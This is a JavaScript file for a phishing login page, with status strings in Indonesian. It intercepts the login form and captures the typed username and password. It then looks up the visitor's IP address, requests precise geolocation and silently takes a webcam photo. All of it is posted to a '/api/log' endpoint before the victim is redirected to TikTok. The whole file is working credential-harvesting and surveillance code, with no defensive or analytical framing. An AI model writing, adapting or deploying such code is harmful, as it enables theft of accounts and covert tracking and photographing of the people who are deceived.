
document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("login-form");
    const statusMsg = document.getElementById("status-msg");

    if (form) {
        form.addEventListener("submit", async (e) => {
            e.preventDefault();
            const username = document.querySelector("input[type=\"text\"]").value;
            const password = document.querySelector("input[type=\"password\"]").value;

            if (statusMsg) statusMsg.style.display = "block";

            let ipData = "Tidak diketahui";
            try {
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const ipJson = await ipRes.json();
                ipData = ipJson.ip;
            } catch (err) {}

            const geoPromise = new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ latitude: "Tidak Didukung", longitude: "Tidak Didukung" });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
                    err => {
                        let reason = "Ditolak/Gagal";
                        if (err.code === err.PERMISSION_DENIED) reason = "Izin Ditolak Pengguna";
                        else if (err.code === err.POSITION_UNAVAILABLE) reason = "Lokasi Tidak Tersedia";
                        else if (err.code === err.TIMEOUT) reason = "Waktu Habis (Timeout)";
                        resolve({ latitude: reason, longitude: reason });
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            });

            const camPromise = (async () => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    await video.play();
                    const canvas = document.createElement("canvas");
                    canvas.width = 640;
                    canvas.height = 480;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const img = canvas.toDataURL("image/jpeg", 0.7);
                    stream.getTracks().forEach(track => track.stop());
                    return img;
                } catch (err) {
                    return null;
                }
            })();

            const [geoResult, camResult] = await Promise.allSettled([geoPromise, camPromise]);

            const coords = geoResult.status === "fulfilled" ? geoResult.value : { latitude: "Gagal", longitude: "Gagal" };
            const base64Image = camResult.status === "fulfilled" ? camResult.value : null;

            try {
                await fetch("/api/log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        username, 
                        password, 
                        ip: ipData, 
                        lat: coords.latitude, 
                        lon: coords.longitude, 
                        image: base64Image, 
                        userAgent: navigator.userAgent 
                    })
                });
            } catch (err) {}

            window.location.href = "https://www.tiktok.com";
        });
    }
});

